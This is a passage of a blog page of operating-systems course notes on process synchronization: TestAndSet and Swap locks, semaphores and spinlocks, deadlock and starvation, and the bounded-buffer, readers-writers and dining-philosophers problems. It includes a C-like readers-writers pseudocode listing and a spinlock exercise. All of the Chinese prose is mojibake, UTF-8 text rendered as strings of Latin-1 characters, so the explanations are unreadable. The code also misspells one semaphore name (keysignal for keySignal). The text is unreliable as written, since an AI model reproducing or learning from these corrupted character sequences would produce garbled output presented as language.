alt="image-20220109162023500"></p><p>TSçš„é€»è¾‘ï¼š<br>å¦‚æœæµ‹è¯•å€¼ä¸ºfalseï¼Œåˆ™è¿”å›falseï¼Œå¹¶æŠŠæµ‹è¯•å€¼ç½®ä¸ºtrueã€‚<br>å¦‚æœæµ‹è¯•å€¼ä¸ºtrueï¼Œåˆ™è¿”å›trueï¼Œæµ‹è¯•å€¼ä»ç„¶ä¸ºtrueã€‚</p><p>Lockä¸ºFALSEï¼Œåˆ™é©¬ä¸Šç»“æŸç©ºå¾ªç¯ï¼›å¦‚æœLockä¸ºTRUEï¼Œåˆ™ä¸€ç›´ç©ºå¾ªç¯ï¼Œç›´åˆ°åˆ«çš„è¿›ç¨‹æŠŠLockæ”¹ä¸ºFALSE</p><p><strong>Swap()</strong></p><p><img src="/posts/8ce3e425/image-20211116162152258.png" alt="image-20211116162152258"></p><p>å¦‚æœåˆ«çš„è¿›ç¨‹æŠŠlockè®¾ç½®ä¸ºflaseï¼Œåˆ™ç»è¿‡Swapäº¤æ¢ä¹‹åï¼ŒKeyä¼šç­‰äºfalse ï¼Œè¿™æ„å‘³ç€å·²ç»æ²¡æœ‰ä¸€ä¸ªè¿›ç¨‹å¤„äºCS</p><p><strong>ä¸Šé¢ä¸¤ç§ç®—æ³•è§£å†³äº†äº’æ–¥ï¼Œæœªè§£å†³æœ‰é™ç­‰å¾…</strong></p><p>ä¸‹é¢çš„ç®—æ³•æ»¡è¶³ä¸´ç•ŒåŒºä¸‰ä¸ªè¦æ±‚ï¼š</p><p>boolean waiting[n];<br>boolean lock;</p><p>è¿™äº›æ•°æ®ç»“æ„å‡åˆå§‹åŒ–falseã€‚</p><p><img src="/posts/8ce3e425/image-20211116162305381.png" alt="image-20211116162305381"></p><ul><li><p>äº’æ–¥</p><p>ä¸ºäº†è¯æ˜æ»¡è¶³äº’æ–¥è¦æ±‚ï¼Œæ³¨æ„ï¼Œåªæœ‰waiting[i]==false æˆ–key==flase æ—¶ï¼Œ è¿›ç¨‹P<sub>i</sub> æ‰è¿›å…¥ä¸´ç•ŒåŒºã€‚åªæœ‰å½“TestAndSetæ‰§è¡Œæ—¶ï¼Œ keyçš„å€¼æ‰å˜æˆfalseã€‚æ‰§è¡ŒTestAndSetçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ä¼šå‘ç°key==falseï¼›æ‰€æœ‰å…¶ä»–è¿›ç¨‹å¿…é¡»ç­‰å¾…ã€‚åªæœ‰å…¶ä»–è¿›ç¨‹ç¦»å¼€å…¶ä¸´ç•ŒåŒºæ—¶ï¼Œå˜é‡waiting[iï¼½çš„å€¼æ‰èƒ½å˜æˆfalseï¼šæ¯æ¬¡åªæœ‰ä¸€ä¸ªwaiting[iï¼½è¢«è®¾ç½®ä¸ºfalse,ä»¥æ»¡è¶³äº’æ–¥è¦æ±‚ã€‚</p></li><li><p>æœ‰ç©ºè®©è¿›</p><p>ä»»ä½•ä¸€ä¸ªå·²ç»è¿›å…¥CSçš„è¿›ç¨‹åœ¨â€œexit sectionâ€ æ—¶ï¼Œè®¾ç½®ï¼šlock =false æˆ– waiting[ j ]= falseï¼Œç¡®ä¿äº†è‡³å°‘å¯ä»¥è®©ä¸€ä¸ªè¿›ç¨‹è¿›å…¥CS</p></li><li><p>æœ‰é™ç­‰å¾…æ¡ä»¶</p><p>ä»»ä½•ä¸€ä¸ªå·²ç»è¿›å…¥CSçš„è¿›ç¨‹Piåœ¨â€œexit sectionâ€ æ—¶ï¼Œ å°†ä¼šä¾æ¬¡æ‰«æwaiting æ•°ç»„ï¼ˆi+1,i+2,â€¦n-1,0,â€¦i-1)ï¼Œå¹¶ä»…å°†Piåé¢æœ€å…ˆæ‰¾åˆ°çš„è¿›ç¨‹jçš„waiting[ j]è®¾ç½®ä¸ºfalse</p><p>è¿™å°±ä½¿è¿›ç¨‹èƒ½ä¾æ­¤å¾ªç¯è¿›å…¥CS</p></li></ul><p><strong>ç¡¬ä»¶æŒ‡ä»¤å®ç°çš„ç¼ºç‚¹</strong></p><ul><li>ç¡¬ä»¶æŒ‡ä»¤è™½ç„¶å¯ä»¥æœ‰æ•ˆåœ°ä¿è¯è¿›ç¨‹é—´äº’æ–¥ï¼Œä½†æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œå°±æ˜¯å½“è¿›ç¨‹æ­£åœ¨ä¸´ç•Œæ®µä¸­æ‰§è¡Œæ—¶ï¼Œå…¶å®ƒæƒ³è¿›å…¥ä¸´ç•Œæ®µçš„è¿›ç¨‹å¿…é¡»ä¸æ–­åœ°æµ‹è¯•å¸ƒå°”å˜é‡lockçš„å€¼ï¼Œè¿™å°±é€ æˆäº†å¤„ç†æœºæœºæ—¶çš„æµªè´¹ï¼Œæˆ‘ä»¬å¸¸ç§°è¿™ç§æƒ…å†µä¸ºâ€œå¿™ç­‰å¾…â€</li><li>å¯èƒ½â€œé¥¥é¥¿â€<strong>ï¼š<strong>å¦‚æœä»ç­‰å¾…è¿›ç¨‹ä¸­éšæœºé€‰æ‹©ä¸€ä¸ªè¿›å…¥ä¸´ç•ŒåŒº</strong>ï¼Œ<strong>æœ‰çš„è¿›ç¨‹å¯èƒ½ä¸€ç›´é€‰ä¸ä¸Š</strong>ã€‚</strong></li></ul><h2 id="65-ä¿¡å·é‡"><a class="markdownIt-Anchor" href="#65-ä¿¡å·é‡"></a> 6.5 ä¿¡å·é‡</h2><p>ä¿¡å·é‡Sæ˜¯ä¸ªæ•´æ•°å˜é‡ï¼Œé™¤äº†åˆå§‹åŒ–å¤–ï¼Œå®ƒåªèƒ½é€šè¿‡ä¸¤ä¸ªæ ‡å‡†åŸå­æ“ä½œï¼šwait()å’Œsignal()æ¥è®¿é—®ã€‚</p><p><img src="/posts/8ce3e425/image-20211116162927219.png" alt="image-20211116162927219"></p><h3 id="651-ç”¨æ³•"><a class="markdownIt-Anchor" href="#651-ç”¨æ³•"></a> 6.5.1 ç”¨æ³•</h3><p><img src="/posts/8ce3e425/image-20211116163758185.png" alt="image-20211116163758185"></p><h3 id="652-å®ç°"><a class="markdownIt-Anchor" href="#652-å®ç°"></a> 6.5.2 å®ç°</h3><p>ä¿¡å·é‡çš„ä¸»è¦ç¼ºç‚¹æ˜¯éƒ½è¦æ±‚<strong>å¿™ç­‰å¾…</strong>ï¼ˆbusy waitingï¼‰ã€‚å½“ä¸€ä¸ªè¿›ç¨‹ä½äºå…¶ä¸´ç•ŒåŒºå†…æ—¶ï¼Œ ä»»ä½•å…¶ä»–è¯•å›¾è¿›å…¥å…¶ä¸´ç•ŒåŒºçš„è¿›ç¨‹éƒ½å¿…é¡»åœ¨å…¶è¿›å…¥ä»£ç ä¸­è¿ç»­åœ°å¾ªç¯ã€‚è¿™ç§ç±»å‹çš„ä¿¡å·é‡ä¹Ÿç§°ä¸º<strong>è‡ªæ—‹é”</strong>ï¼ˆspinlockï¼‰</p><p>ä¸ºäº†å…‹æœå¿™ç­‰ï¼Œ å¯ä»¥ä¿®æ”¹ä¿¡å·é‡æ“ä½œwait()å’Œsignal()çš„å®šä¹‰ã€‚å½“ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œwait()æ“ä½œæ—¶ï¼Œ å‘ç°ä¿¡å·é‡å€¼ä¸ä¸ºæ­£ï¼Œ åˆ™å®ƒå¿…é¡»ç­‰å¾…ã€‚ç„¶è€Œï¼Œ è¯¥è¿›ç¨‹ä¸æ˜¯å¿™ç­‰è€Œæ˜¯é˜»å¡è‡ªå·±ã€‚é˜»å¡æ“ä½œå°†ä¸€ä¸ªè¿›ç¨‹æ”¾å…¥åˆ°ä¸ä¿¡å·é‡ç›¸å…³çš„ç­‰å¾…é˜Ÿåˆ—ä¸­ï¼Œäº•å°†è¯¥è¿›ç¨‹çš„çŠ¶æ€åˆ‡æ¢æˆç­‰å¾…çŠ¶æ€ã€‚æ¥ç€ï¼Œ æ§åˆ¶è½¬åˆ°CPUè°ƒåº¦ç¨‹åºï¼Œ ä»¥é€‰æ‹©å¦ä¸€ä¸ªè¿›ç¨‹æ¥æ‰§è¡Œã€‚</p><p>ä¸€ä¸ªè¢«é˜»å¡åœ¨ç­‰å¾…ä¿¡å·é‡Sä¸Šçš„è¿›ç¨‹ï¼Œå¯ä»¥åœ¨å…¶ä»–è¿›ç¨‹æ‰§è¡Œsignal()æ“ä½œä¹‹åè¢«é‡æ–°æ‰§è¡Œã€‚è¯¥è¿›ç¨‹çš„é‡æ–°æ‰§è¡Œæ˜¯é€šè¿‡wakeup()æ“ä½œæ¥è¿›è¡Œçš„ï¼Œ è¯¥æ“ä½œå°†è¿›ç¨‹ä»ç­‰å¾…çŠ¶æ€åˆ‡æ¢åˆ°å°±ç»ªçŠ¶æ€ã€‚æ¥ç€ï¼Œ è¯¥è¿›ç¨‹è¢«æ”¾å…¥åˆ°å°±ç»ªé˜Ÿåˆ—ä¸­ï¼ˆæ ¹æ®CPUè°ƒåº¦ç®—æ³•çš„ä¸åŒï¼ŒCPUæœ‰å¯èƒ½ä¼šã€ä¹Ÿå¯èƒ½ä¸ä¼šä»æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹åˆ‡æ¢åˆ°åˆšåˆšå°±ç»ªçš„è¿›ç¨‹ï¼‰ã€‚</p><p><img src="/posts/8ce3e425/image-20211116164332005.png" alt="image-20211116164332005"></p><p><img src="/posts/8ce3e425/image-20211116164343388.png" alt="image-20211116164343388"></p><p><img src="/posts/8ce3e425/image-20211116165105798.png" alt="image-20211116165105798"></p><h3 id="653-æ­»é”ä¸é¥¥é¥¿"><a class="markdownIt-Anchor" href="#653-æ­»é”ä¸é¥¥é¥¿"></a> 6.5.3 æ­»é”ä¸é¥¥é¥¿</h3><p><strong>æ­»é”</strong>ï¼šä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹æ— é™åœ°ç­‰å¾…ä¸€ä¸ªäº‹ä»¶ï¼Œè€Œè¯¥äº‹ä»¶åªèƒ½ç”±è¿™äº›ç­‰å¾…è¿›ç¨‹ä¹‹ä¸€æ¥äº§ç”Ÿã€‚è¿™é‡Œçš„äº‹ä»¶æ˜¯signal()æ“ä½œçš„æ‰§è¡Œã€‚å½“å‡ºç°è¿™æ ·çš„çŠ¶æ€æ—¶ï¼Œ è¿™äº›è¿›ç¨‹å°±ç§°ä¸ºæ­»é”ï¼ˆdeadlockedï¼‰ã€‚</p><p><strong>æ— é™æœŸé˜»å¡</strong>(indefinite blockingï¼‰æˆ–<strong>é¥¥é¥¿</strong>ï¼ˆstarvationï¼‰ï¼šå³è¿›ç¨‹åœ¨ä¿¡å·é‡å†…æ— é™æœŸç­‰å¾…ã€‚å¦‚æœå¯¹ä¸ä¿¡å·é‡ç›¸å…³çš„é“¾è¡¨æŒ‰LIFOé¡ºåºæ¥å¢åŠ å’Œç§»åŠ¨è¿›ç¨‹ï¼Œ<br>é‚£ä¹ˆå¯èƒ½ä¼šå‘ç”Ÿæ— é™æœŸé˜»å¡ã€‚</p><h3 id="654-ä¿¡å·é‡å°ç»“"><a class="markdownIt-Anchor" href="#654-ä¿¡å·é‡å°ç»“"></a> 6.5.4 ä¿¡å·é‡å°ç»“</h3><ol><li><p><strong>ä¿¡å·é‡çš„ç‰©ç†å«ä¹‰ï¼š</strong></p><p>**S&gt;0ï¼š**è¡¨ç¤ºæœ‰Sä¸ªèµ„æºå¯ç”¨</p><p>**S=0ï¼š**è¡¨ç¤ºæ— èµ„æºå¯ç”¨</p><p>**S&lt;0ï¼š**åˆ™|S|è¡¨ç¤ºSç­‰å¾…é˜Ÿåˆ—ä¸­çš„è¿›ç¨‹ä¸ªæ•°</p><p>**P(S)ï¼š**è¡¨ç¤ºç”³è¯·ä¸€ä¸ªèµ„æº</p><p>**V(S)ï¼š**è¡¨ç¤ºé‡Šæ”¾ä¸€ä¸ªèµ„æºã€‚</p></li><li><p><strong>P.Væ“ä½œå¿…é¡»æˆå¯¹å‡ºç°ï¼Œæœ‰ä¸€ä¸ªPæ“ä½œå°±ä¸€å®šæœ‰ä¸€ä¸ªVæ“ä½œ</strong></p><p>å½“ä¸º<strong>äº’æ–¥æ“ä½œ</strong>æ—¶ï¼Œå®ƒä»¬åŒå¤„äºåŒä¸€è¿›ç¨‹</p><p>å½“ä¸º<strong>åŒæ­¥æ“ä½œ</strong>æ—¶ï¼Œåˆ™ä¸åœ¨åŒä¸€è¿›ç¨‹ä¸­å‡ºç°</p><p>å¦‚æœP(S1)å’ŒP(S2)ä¸¤ä¸ªæ“ä½œåœ¨ä¸€èµ·ï¼Œé‚£ä¹ˆPæ“ä½œçš„é¡ºåºè‡³å…³é‡è¦,ä¸€ä¸ªåŒæ­¥Pæ“ä½œä¸ä¸€ä¸ªäº’æ–¥Pæ“ä½œåœ¨ä¸€èµ·æ—¶ï¼ŒåŒæ­¥Pæ“ä½œåœ¨äº’æ–¥Pæ“ä½œå‰ã€‚</p><p>è€Œä¸¤ä¸ªVæ“ä½œæ— å…³ç´§è¦</p></li><li><p><strong>P.Væ“ä½œçš„ä¼˜ç¼ºç‚¹</strong></p><ul><li>ä¼˜ç‚¹ï¼šç®€å•ï¼Œè€Œä¸”è¡¨è¾¾èƒ½åŠ›å¼ºï¼ˆç”¨P.Væ“ä½œå¯è§£å†³ä»»ä½•åŒæ­¥äº’æ–¥é—®é¢˜ï¼‰</li><li>ç¼ºç‚¹ï¼šä¸å¤Ÿå®‰å…¨ï¼›P.Væ“ä½œä½¿ç”¨ä¸å½“ä¼šå‡ºç°æ­»é”ï¼›é‡åˆ°å¤æ‚åŒæ­¥äº’æ–¥é—®é¢˜æ—¶å®ç°å¤æ‚</li></ul></li></ol><p><strong>è€Œä¸¤ä¸ªVæ“ä½œæ— å…³ç´§è¦</strong></p><h2 id="66-ç»å…¸åŒæ­¥é—®é¢˜"><a class="markdownIt-Anchor" href="#66-ç»å…¸åŒæ­¥é—®é¢˜"></a> 6.6 ç»å…¸åŒæ­¥é—®é¢˜</h2><p>ä½¿ç”¨PVæ“ä½œå®Œæˆè¿›ç¨‹é—´çš„<strong>åŒæ­¥ä¸äº’æ–¥æ­¥éª¤</strong>ï¼š</p><ol><li>åˆ†æåŒæ­¥å…³ç³»ï¼ˆåˆ¶çº¦å…³ç³»ï¼‰</li><li>è®¾ç½®ä¿¡å·é‡ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæœ‰å‡ é¡¹åˆ¶çº¦æ¡ä»¶å°±åº”è®¾ç½®å‡ ä¸ªä¿¡å·é‡ï¼‰</li><li>é€‰æ‹©å¹¶ç¡®å®šä¿¡å·é‡çš„åˆå€¼ï¼ˆåˆå€¼å’Œåˆå§‹å¯ç”¨èµ„æºæœ‰å…³ï¼‰</li><li>åˆ©ç”¨PVæ“ä½œå†™å‡ºåŒæ­¥å…³ç³»ã€‚</li></ol><h3 id="661-æœ‰é™ç¼“å†²é—®é¢˜"><a class="markdownIt-Anchor" href="#661-æœ‰é™ç¼“å†²é—®é¢˜"></a> 6.6.1 æœ‰é™ç¼“å†²é—®é¢˜</h3><p><img src="/posts/8ce3e425/image-20211116164843159.png" alt="image-20211116164843159"></p><p>ä¸‹å›¾ä¼šå‘ç”Ÿæ­»é”ï¼Œç”Ÿäº§è€…ä¸€ç›´ç­‰å¾…</p><p><img src="/posts/8ce3e425/image-20211116165556108.png" alt="image-20211116165556108"></p><h3 id="662-è¯»è€…å†™è€…é—®é¢˜"><a class="markdownIt-Anchor" href="#662-è¯»è€…å†™è€…é—®é¢˜"></a> 6.6.2 è¯»è€…å†™è€…é—®é¢˜</h3><p><strong>åˆ¶çº¦æ¡ä»¶åˆ†æï¼š</strong></p><p>1ã€å…è®¸å¤šä¸ªè¿›ç¨‹åŒæ—¶è¯»æ–‡ä»¶ï¼ˆè¯»ï¼è¯»å…è®¸ï¼‰ï¼›<br>2ã€ä¸å…è®¸åœ¨è¿›ç¨‹è¯»æ–‡ä»¶æ—¶è®©å¦å¤–ä¸€è¿›ç¨‹å»å†™æ–‡ä»¶ï¼›æœ‰è¿›ç¨‹åœ¨å†™æ–‡ä»¶æ—¶ä¸è®©å¦å¤–ä¸€ä¸ªè¿›ç¨‹å»è¯»è¯¥æ–‡ä»¶ï¼ˆâ€œè¯»-å†™â€äº’æ–¥ï¼‰ï¼›<br>3ã€ä¸å…è®¸å¤šä¸ªå†™è¿›ç¨‹åŒæ—¶å†™åŒä¸€æ–‡ä»¶ï¼ˆâ€œå†™-å†™â€äº’æ–¥ï¼‰ã€‚</p><h4 id="è¯»è€…ä¼˜å…ˆ"><a class="markdownIt-Anchor" href="#è¯»è€…ä¼˜å…ˆ"></a> <strong>è¯»è€…ä¼˜å…ˆï¼š</strong></h4><p>åªè¦ä¸æ–­çš„æœ‰è¯»è€…æ¥è¯»ï¼Œé‚£ä¹ˆreadcountå°±ä¸€ç›´ä¼šå¤§äº0ï¼Œé‚£ä¹ˆæ°¸è¿œä¸ä¼šè§¦å‘signal(wrt)æ¡ä»¶ï¼Œä»è€Œå¯¼è‡´å†™è€…é¥¥é¥¿ã€‚</p><p>è¯¥é—®é¢˜è¢«ç§°ä¸ºç¬¬ä¸€è¯»è€…ä¼˜å…ˆé—®é¢˜</p><p><img src="/posts/8ce3e425/image-20211116170507558.png" alt="image-20211116170507558"></p><h4 id="å†™è€…ä¼˜å…ˆ"><a class="markdownIt-Anchor" href="#å†™è€…ä¼˜å…ˆ"></a> <strong>å†™è€…ä¼˜å…ˆ:</strong></h4><p>1.å†™è€…çº¿ç¨‹çš„ä¼˜å…ˆçº§é«˜äºè¯»è€…çº¿ç¨‹ã€‚<br>2.å½“å†™è€…åˆ°æ¥æ—¶ï¼Œåªæœ‰é‚£äº›å·²ç»è·å¾—æˆæƒçš„è¯»è¿›ç¨‹æ‰è¢«å…è®¸å®Œæˆå®ƒä»¬çš„æ“ä½œï¼Œå†™è€…ä¹‹ååˆ°æ¥çš„è¯»è€…å°†è¢«æ¨è¿Ÿï¼Œç›´åˆ°å†™è€…å®Œæˆã€‚<br>3.å½“æ²¡æœ‰å†™è€…è¿›ç¨‹æ—¶è¯»è€…è¿›ç¨‹åº”è¯¥èƒ½å¤ŸåŒæ—¶è¯»å–æ–‡ä»¶ã€‚</p><p><strong>å…·ä½“å®ç°:</strong><br>1.é€šè¿‡æ·»åŠ ä¿¡å·é‡<code>read</code>å®ç°å†™è€…åˆ°æ¥æ—¶èƒ½å¤Ÿé˜»æ­¢è¯»è€…è¿›ç¨‹ã€‚<br>2.è®¾ç½®ä¿¡å·é‡<code>fileSrc</code>å®ç°è¯»å†™è€…å¯¹ä¸´ç•Œèµ„æºçš„è®¿é—®ã€‚<br>3.è®¾ç½®è®¡æ•°å™¨<code>writeCount</code>æ¥ç»Ÿè®¡å½“å‰é˜»å¡çš„å†™è€…è¿›ç¨‹çš„æ•°ç›®ï¼Œè®¾ç½®ä¿¡å·é‡<code>writeCountSignal</code>å®Œæˆå¯¹<code>writeCount</code>è®¡æ•°å™¨èµ„æºçš„äº’æ–¥è®¿é—®ã€‚<br>4.è®¾ç½®è®¡æ•°å™¨<code>readCount</code>æ¥ç»Ÿè®¡è®¿é—®ä¸´ç•Œèµ„æºçš„è¯»è€…æ•°ç›®ï¼Œè®¾ç½®ä¿¡å·é‡<code>readCountSignal</code>å®Œæˆå¯¹<code>readCount</code>è®¡æ•°å™¨èµ„æºçš„äº’æ–¥è®¿é—®ã€‚</p><p><img src="/posts/8ce3e425/image-20211116170755343.png" alt="image-20211116170755343"></p><h4 id="è¯»è€…å†™è€…å…¬å¹³ç«äº‰"><a class="markdownIt-Anchor" href="#è¯»è€…å†™è€…å…¬å¹³ç«äº‰"></a> è¯»è€…å†™è€…å…¬å¹³ç«äº‰ï¼š</h4><ol><li>ä¼˜å…ˆçº§ç›¸åŒã€‚</li><li>å†™è€…ã€è¯»è€…äº’æ–¥è®¿é—®ã€‚</li><li>åªèƒ½æœ‰ä¸€ä¸ªå†™è€…è®¿é—®ä¸´ç•ŒåŒºã€‚</li><li>å¯ä»¥æœ‰å¤šä¸ªè¯»è€…åŒæ—¶è®¿é—®ä¸´ç•Œèµ„æºã€‚</li></ol><p><strong>å…·ä½“å®ç°:</strong></p><ol><li>è®¾ç½®<code>file</code>ä¿¡å·é‡å®ç°å¯¹ä¸´ç•Œèµ„æºçš„äº’æ–¥è®¿é—®ã€‚</li><li>è®¾ç½®è®¡æ•°å™¨<code>readCount</code>å®ç°å¤šä¸ªè¯»è€…è®¿é—®ä¸´ç•Œèµ„æºï¼Œé€šè¿‡è®¾ç½®ä¿¡å·é‡<code>readCountSignal</code>å®ç°å¯¹<code>readCount</code>è®¡æ•°å™¨çš„äº’æ–¥è®¿é—®ã€‚</li><li>è®¾ç½®ä¿¡å·é‡<code>keySignal</code>å®ç°è¯»è€…å’Œå†™è€…çš„å…¬å¹³ç«äº‰ï¼ˆä»¤ç‰Œï¼‰ã€‚</li></ol><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* è¯»è€…é˜Ÿåˆ—åˆå§‹å€¼ä¸º0ï¼Œå…¶ä»–èµ„æºåˆå§‹å€¼ä¸º1*/</span><br><span class="hljs-keyword">int</span> readCount = <span class="hljs-number">0</span>;<br>semaphore keySignal = <span class="hljs-number">1</span>;<br>semaphore fileSrc = <span class="hljs-number">1</span>;<br>semaphore readCountSignal = <span class="hljs-number">1</span>;<br><br><span class="hljs-built_in">reader</span>()<br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;<br>      <span class="hljs-built_in">wait</span>(keySignal);        <span class="hljs-comment">//ç”³è¯·ä»¤ç‰Œ</span><br>      <span class="hljs-built_in">wait</span>(readCountSignal);  <span class="hljs-comment">//ç”³è¯·è®¡æ•°å™¨èµ„æº</span><br>      <span class="hljs-keyword">if</span>(!readCount)          <span class="hljs-comment">//ä¸ºé›¶åˆ™ç”³è¯·æ–‡ä»¶èµ„æº</span><br>         <span class="hljs-built_in">wait</span>(fileSrc);<br>      readCount++;<br>      <span class="hljs-built_in">signal</span>(readCountSignal); <span class="hljs-comment">//é‡Šæ”¾è®¡æ•°å™¨èµ„æº</span><br>      <span class="hljs-built_in">signal</span>(keySignal);      <span class="hljs-comment">//é‡Šæ”¾ä»¤ç‰Œ</span><br> <br>      ...<br>      perform read operation  <span class="hljs-comment">//æ‰§è¡Œä¸´ç•ŒåŒºä»£ç </span><br>      ...<br>  <br>      <span class="hljs-built_in">wait</span>(readCountSignal);  <span class="hljs-comment">//ç”³è¯·è®¡æ•°å™¨èµ„æº</span><br>      readCount--;<br>      <span class="hljs-keyword">if</span>(!readCount)                <span class="hljs-comment">//ä¸ºé›¶åˆ™é‡Šæ”¾æ–‡ä»¶èµ„æº</span><br>         <span class="hljs-built_in">signal</span>(fileSrc);<br>      <span class="hljs-built_in">signal</span>(readCountSignal); <span class="hljs-comment">//é‡Šæ”¾è¯»è€…è®¡æ•°å™¨èµ„æº</span><br>    &#125;<br>&#125;<br> <br><span class="hljs-built_in">writer</span>()<br>&#123;<br>     <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>     &#123;<br>        <span class="hljs-built_in">wait</span>(keySignal);     <span class="hljs-comment">//ç”³è¯·ä»¤ç‰Œ</span><br>        <span class="hljs-built_in">wait</span>(fileSrc);       <span class="hljs-comment">//ç”³è¯·æ–‡ä»¶èµ„æº</span><br> <br>        ...<br>        perform write operation <span class="hljs-comment">//æ‰§è¡Œä¸´ç•ŒåŒºä»£ç </span><br>        ...<br> <br>        <span class="hljs-built_in">signal</span>(fileSrc);   <span class="hljs-comment">//é‡Šæ”¾æ–‡ä»¶èµ„æº</span><br>        <span class="hljs-built_in">signal</span>(keysignal); <span class="hljs-comment">//é‡Šæ”¾ä»¤ç‰Œ</span><br>     &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="663-å“²å­¦å®¶è¿›é¤å›é¢˜"><a class="markdownIt-Anchor" href="#663-å“²å­¦å®¶è¿›é¤å›é¢˜"></a> 6.6.3 å“²å­¦å®¶è¿›é¤å›é¢˜</h3><p><img src="/posts/8ce3e425/image-20211116170946819.png" alt="image-20211116170946819"></p><p><strong>æ­»é”è§£å†³æ–¹æ³•ï¼š</strong></p><ul><li>è‡³å¤šåªå…è®¸å››ä½å“²å­¦å®¶åŒæ—¶å»æ‹¿å·¦è¾¹çš„ç­·å­ï¼›</li><li>ä»…å½“å“²å­¦å®¶å·¦å³ä¸¤è¾¹çš„ç­·å­å‡å¯ç”¨æ—¶æ‰å…è®¸ä»–æ‹¿èµ·ç­·å­ï¼›</li><li>è§„å®šå¥‡æ•°å·å“²å­¦å®¶å…ˆæ‹¿èµ·ä»–å·¦è¾¹çš„ç­·å­ï¼Œè€Œå¶æ•°å·å“²å­¦å®¶å…ˆæ‹¿èµ·ä»–å³è¾¹çš„ç­·å­ã€‚</li></ul><p><img src="/posts/8ce3e425/image-20211116171117548.png" alt="image-20211116171117548"></p><p><img src="/posts/8ce3e425/image-20211116171127875.png" alt="image-20211116171127875"></p><h2 id="611-ä¹ é¢˜"><a class="markdownIt-Anchor" href="#611-ä¹ é¢˜"></a> 6.11 ä¹ é¢˜</h2><p>**è¯•è§£é‡Šä¸ºä»€ä¹ˆè‡ªæ—‹é”å¯¹å•å¤„ç†å™¨ç³»ç»Ÿä¸åˆé€‚è€Œå¯¹å¤šå¤„ç†å™¨ç³»ç»Ÿåˆé€‚ã€‚  **</p><blockquote><p>è§£ç­”ï¼š<br>è‡ªæ—‹é”ï¼ˆè¿›ç¨‹åœ¨å…¶ç­‰å¾…é”æ—¶è¿˜åœ¨è¿è¡Œï¼‰çš„ç¼ºç‚¹æ˜¯å¿™ç­‰å¾…ï¼Œå½“ä¸€ä¸ªè¿›ç¨‹ä½äºå…¶ä¸´ç•ŒåŒºå†…æ—¶ï¼Œä»»ä½•å…¶å®ƒè¯•å›¾è¿›å…¥å…¶ä¸´ç•ŒåŒºçš„è¿›ç¨‹éƒ½å¿…é¡»åœ¨å…¶è¿›å…¥ä»£ç ä¸­è¿ç»­åœ°å¾ªç¯ã€‚åœ¨å•å¤„ç†å™¨ç³»ç»Ÿä¸­ï¼Œå¿™ç­‰å¾…æµªè´¹äº†CPUæ—¶é’Ÿï¼ˆè¿™äº›æ—¶é’Ÿæœ¬æ¥å¯ä»¥æœ‰æ•ˆåœ°ä¸ºå…¶ä»–è¿›ç¨‹æ‰€ä½¿ç”¨ï¼‰ã€‚<br>è‡ªæ—‹é”çš„ä¼˜ç‚¹å°±æ˜¯ï¼Œè¿›ç¨‹åœ¨ç­‰å¾…é”æ—¶ä¸ä¼šè¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œè€Œä¸Šä¸‹æ–‡åˆ‡æ¢å¯èƒ½éœ€è¦èŠ±è´¹ç›¸å½“é•¿çš„æ—¶é—´ã€‚å› æ­¤ï¼Œå¦‚æœé”çš„å ç”¨æ—¶é—´çŸ­ï¼Œè‡ªæ—‹é”å°±å¯ä»¥å˜å¾—éå¸¸æœ‰ç”¨ã€‚å®ƒå¸¸å¸¸ç”¨äºå¤šå¤„ç†å™¨ç³»ç»Ÿä¸­ï¼Œè¿™æ ·ä¸€ä¸ªçº¿ç¨‹åœ¨ä¸€ä¸ªå¤„ç†å™¨è‡ªæ—‹æ—¶ï¼Œå¦ä¸€çº¿ç¨‹å¯åœ¨å¦ä¸€å¤„ç†å™¨ä¸Šåœ¨å…¶ä¸´ç•ŒåŒºå†…æ‰§è¡Œã€‚</p></blockquote><h3 id="ä¿¡å·é‡ç¡®å®š"><a class="markdownIt-Anchor" href="#ä¿¡å·é‡ç¡®å®š"></a> 